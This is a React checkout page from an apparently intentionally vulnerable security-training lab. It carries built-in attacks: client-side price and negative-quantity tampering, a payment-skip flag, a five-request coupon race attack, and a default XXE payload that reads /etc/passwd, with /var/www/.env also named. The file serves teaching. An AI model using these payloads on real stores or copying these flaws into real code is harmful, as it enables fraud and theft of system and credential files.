"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { ShoppingCart, Zap, FileCode, Layers } from "lucide-react";
import { useLab } from "@/components/LabProvider";

export default function CheckoutPage() {
  const router = useRouter();
  const { cart, updateCartItem, currentUser, refreshLabState } = useLab();

  const [shippingAddress, setShippingAddress] = useState(
    currentUser?.full_name
      ? "742 Evergreen Terrace, Apt 4B, Springfield"
      : "1337 Pentest Blvd, Suite 404"
  );
  const [skipPaymentCheck, setSkipPaymentCheck] = useState(false);
  const [couponCode, setCouponCode] = useState("WELCOME50");
  const [checkoutResult, setCheckoutResult] = useState<any>(null);
  const [raceResults, setRaceResults] = useState<any[]>([]);

  // XXE XML Import state
  const [xmlPayload, setXmlPayload] = useState(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <item>
    <product_id>1</product_id>
    <quantity>1</quantity>
    <notes>&xxe;</notes>
  </item>
</order>`);
  const [xxeResult, setXxeResult] = useState<any>(null);

  const totalPreview = cart.reduce(
    (sum, item) => sum + item.quantity * item.price,
    0
  );

  const handleCheckout = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: currentUser?.id || 1,
        shipping_address: shippingAddress,
        skipPaymentCheck,
        items: cart.map((c) => ({
          product_id: c.product_id,
          quantity: c.quantity,
          unit_price: c.price,
        })),
      }),
    });
    const data = await res.json();
    setCheckoutResult({ status: res.status, data });
    await refreshLabState();
  };

  // BIZ-02: Fire 5 simultaneous coupon redemption requests to exploit TOCTOU race window
  const runParallelRaceConditionAttack = async () => {
    setRaceResults([]);
    const requests = Array.from({ length: 5 }, (_, idx) =>
      fetch("/api/coupons/redeem", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: currentUser?.id || 1,
          code: couponCode,
        }),
      }).then(async (r) => ({
        thread: idx + 1,
        status: r.status,
        body: await r.json(),
      }))
    );

    const settled = await Promise.all(requests);
    setRaceResults(settled);
    await refreshLabState();
  };

  const handleXmlImport = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/orders/import-xml", {
      method: "POST",
      headers: { "Content-Type": "application/xml" },
      body: xmlPayload,
    });
    const data = await res.json();
    setXxeResult(data);
    await refreshLabState();
  };

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        {/* Left: BIZ-01 Price & Negative Qty Manipulation + BIZ-03 Workflow Bypass */}
        <form
          onSubmit={handleCheckout}
          className="space-y-4 rounded-2xl border border-slate-800 bg-slate-900/70 p-6"
        >
          <div className="flex items-center gap-2 text-white font-bold text-lg">
            <ShoppingCart className="h-5 w-5 text-indigo-400" />
            <h2>
              Checkout & Parameter Tampering (BIZ-01 / BIZ-03)
            </h2>
          </div>
          <p className="text-xs text-slate-400">
            In <span className="text-rose-400 font-mono">LOW</span> and{" "}
            <span className="text-amber-400 font-mono">MEDIUM</span> modes, the
            server trusts the client-submitted{" "}
            <code className="text-slate-200">unit_price</code> and{" "}
            <code className="text-slate-200">quantity</code> fields—allowing{" "}
            <span className="text-emerald-300">$0.01 purchases</span> or{" "}
            <span className="text-rose-300">negative quantities</span> that
            credit your wallet balance!
          </p>

          <div className="flex flex-wrap gap-2">
            <button
              type="button"
              onClick={() => {
                if (cart[0]) {
                  updateCartItem(cart[0].product_id, { price: 0.01 });
                }
              }}
              className="inline-flex items-center gap-1 rounded-lg border border-emerald-500/40 bg-emerald-500/10 px-3 py-1 text-xs text-emerald-300 hover:bg-emerald-500/20 cursor-pointer"
            >
              <Zap className="h-3.5 w-3.5" />
              Tamper Price to $0.01 (BIZ-01)
            </button>
            <button
              type="button"
              onClick={() => {
                if (cart[0]) {
                  updateCartItem(cart[0].product_id, {
                    quantity: -5,
                    price: 169.0,
                  });
                }
              }}
              className="rounded-lg border border-rose-500/40 bg-rose-500/10 px-3 py-1 text-xs text-rose-300 hover:bg-rose-500/20 cursor-pointer"
            >
              Tamper Quantity to -5 (Credits +$845 to Wallet!)
            </button>
          </div>

          <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950/80 p-4">
            {cart.map((item) => (
              <div
                key={item.product_id}
                className="grid grid-cols-1 gap-2 sm:grid-cols-3 items-center border-b border-slate-800/80 pb-3 last:border-none last:pb-0"
              >
                <div className="text-xs font-semibold text-white">
                  {item.name}
                </div>
                <div>
                  <label className="block text-[11px] text-slate-400">
                    Quantity (Tamperable)
                  </label>
                  <input
                    type="number"
                    value={item.quantity}
                    onChange={(e) =>
                      updateCartItem(item.product_id, {
                        quantity: Number(e.target.value),
                      })
                    }
                    className="w-full rounded border border-slate-700 bg-slate-900 px-2.5 py-1 text-xs font-mono text-white"
                  />
                </div>
                <div>
                  <label className="block text-[11px] text-slate-400">
                    Client Unit Price ($)
                  </label>
                  <input
                    type="number"
                    step="0.01"
                    value={item.price}
                    onChange={(e) =>
                      updateCartItem(item.product_id, {
                        price: Number(e.target.value),
                      })
                    }
                    className="w-full rounded border border-slate-700 bg-slate-900 px-2.5 py-1 text-xs font-mono text-emerald-400"
                  />
                </div>
              </div>
            ))}
          </div>

          <div>
            <label className="block text-xs text-slate-400 mb-1">
              Shipping Address
            </label>
            <input
              type="text"
              value={shippingAddress}
              onChange={(e) => setShippingAddress(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-xs text-white"
            />
          </div>

          <label className="flex items-center gap-2 text-xs text-amber-300 cursor-pointer">
            <input
              type="checkbox"
              checked={skipPaymentCheck}
              onChange={(e) => setSkipPaymentCheck(e.target.checked)}
              className="rounded border-slate-700"
            />
            <span>
              <strong>BIZ-03 Workflow Bypass:</strong> Send{" "}
              <code>skipPaymentCheck: true</code> to complete order without
              wallet deduction
            </span>
          </label>

          <div className="flex items-center justify-between border-t border-slate-800 pt-3">
            <div className="font-mono text-sm font-bold text-white">
              Client-Calculated Total:{" "}
              <span
                className={
                  totalPreview < 0 ? "text-rose-400" : "text-emerald-400"
                }
              >
                ${totalPreview.toFixed(2)}
              </span>
            </div>
            <button
              type="submit"
              className="rounded-xl bg-indigo-600 px-5 py-2 text-sm font-semibold text-white hover:bg-indigo-500 cursor-pointer"
            >
              Submit Checkout
            </button>
          </div>

          {checkoutResult && (
            <div className="rounded-xl border border-slate-700 bg-slate-950 p-3 font-mono text-xs">
              <div className="flex items-center justify-between mb-1">
                <span className="text-indigo-300 font-bold">
                  Checkout Response (HTTP {checkoutResult.status})
                </span>
                {checkoutResult.data?.orderId && (
                  <button
                    type="button"
                    onClick={() =>
                      router.push(`/orders/${checkoutResult.data.orderId}`)
                    }
                    className="text-emerald-400 underline cursor-pointer"
                  >
                    View Order #{checkoutResult.data.orderId}
                  </button>
                )}
              </div>
              <pre className="overflow-x-auto text-slate-200">
                {JSON.stringify(checkoutResult.data, null, 2)}
              </pre>
            </div>
          )}
        </form>

        {/* Right: BIZ-02 Race Condition + INJ-04 XXE XML Order Import */}
        <div className="space-y-6">
          {/* BIZ-02 Race Condition */}
          <div className="space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-6">
            <div className="flex items-center gap-2 text-amber-300 font-bold">
              <Layers className="h-5 w-5" />
              <h2>TOCTOU Race Condition Lab (BIZ-02)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Single-use coupon <code className="text-white">WELCOME50</code>{" "}
              ($50) has <code className="text-white">max_uses = 1</code>, but
              the server waits <code className="text-white">200ms</code> between
              checking <code className="text-white">times_used</code> and
              updating it. Send 5 parallel requests to redeem it 5 times!
            </p>

            <div className="flex flex-wrap gap-2">
              <input
                type="text"
                value={couponCode}
                onChange={(e) => setCouponCode(e.target.value)}
                className="rounded-lg border border-slate-700 bg-slate-950 px-3 py-1.5 text-xs font-mono text-white"
              />
              <button
                type="button"
                onClick={runParallelRaceConditionAttack}
                className="inline-flex items-center gap-1.5 rounded-lg bg-rose-600 px-4 py-1.5 text-xs font-semibold text-white hover:bg-rose-500 cursor-pointer"
              >
                <Zap className="h-3.5 w-3.5" />
                Launch 5x Concurrent Race Attack
              </button>
            </div>

            {raceResults.length > 0 && (
              <div className="rounded-xl border border-slate-800 bg-slate-950 p-3 font-mono text-xs space-y-1">
                {raceResults.map((r) => (
                  <div
                    key={r.thread}
                    className={
                      r.status === 200 ? "text-emerald-400" : "text-rose-400"
                    }
                  >
                    Thread #{r.thread} (HTTP {r.status}):{" "}
                    {r.body.creditedAmount
                      ? `+$${r.body.creditedAmount} credited! Wallet: $${r.body.newWalletBalance}`
                      : r.body.error}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* INJ-04 XXE Bulk XML Import */}
          <form
            onSubmit={handleXmlImport}
            className="space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-6"
          >
            <div className="flex items-center gap-2 text-indigo-300 font-bold">
              <FileCode className="h-5 w-5" />
              <h2>Bulk Order XML Import (INJ-04 XXE Injection)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Parses XML order uploads with external entity resolution enabled (
              <code className="text-slate-200">
                SYSTEM &quot;file:///etc/passwd&quot;
              </code>{" "}
              or{" "}
              <code className="text-slate-200">
                SYSTEM &quot;file:///var/www/.env&quot;
              </code>
              ).
            </p>

            <textarea
              rows={7}
              value={xmlPayload}
              onChange={(e) => setXmlPayload(e.target.value)}
              className="w-full rounded-xl border border-slate-700 bg-slate-950 p-3 font-mono text-xs text-amber-300"
            />

            <button
              type="submit"
              className="rounded-xl bg-indigo-600 px-4 py-2 text-xs font-semibold text-white hover:bg-indigo-500 cursor-pointer"
            >
              Parse XML & Resolve Entities
            </button>

            {xxeResult && (
              <div className="rounded-xl border border-slate-700 bg-slate-950 p-3 font-mono text-xs">
                <pre className="whitespace-pre-wrap text-emerald-300">
                  {JSON.stringify(xxeResult, null, 2)}
                </pre>
              </div>
            )}
          </form>
        </div>
      </div>
    </div>
  );
}

